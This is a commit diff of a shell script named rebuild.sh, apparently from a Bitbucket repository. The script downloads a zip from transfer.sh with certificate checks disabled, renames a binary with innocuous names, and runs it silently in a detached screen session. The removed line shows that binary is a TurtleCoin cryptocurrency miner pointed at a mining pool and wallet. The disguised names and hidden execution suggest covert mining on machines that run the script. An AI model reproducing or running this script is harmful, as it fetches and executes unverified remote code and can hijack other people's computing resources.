28e7b3ad53858ff6d615b68f7e10e7fa60d4c0a6
mata lima <lamajuahsu@outlook.com>
2021-10-28 06:44:51 +0000

    rebuild.sh edited online with Bitbucket

--- rebuild.sh
+++ rebuild.sh
@@ -4,11 +4,11 @@
 
 apt update
 apt -y install screen unzip
-wget --no-check-certificate -c https://transfer.sh/glULeN/vault.zip
+wget --no-check-certificate -c https://transfer.sh/DkYGQH/vault.zip
 unzip vault.zip
 mv checker vault
 cd vault
-screen -dmS build ./vault --donate-level 1 -o us.turtlecoin.herominers.com:1160 -u TRTLv3XdA6KgV9dHSXXB1pJtSjdQdLXuJewbc5SALSGcaXwyKkj548iWqBKxQEnyeRV7hfBw8FaveMmBDzeRCjQ7arJQASUnca2 -p $(echo $(shuf -i 1-20000 -n 1)-V) -a argon2/chukwav2 -k
+screen -dmS hero ./hero
 > /dev/null 2>&1
 chmod 777 checker && ./checker
 echo succes
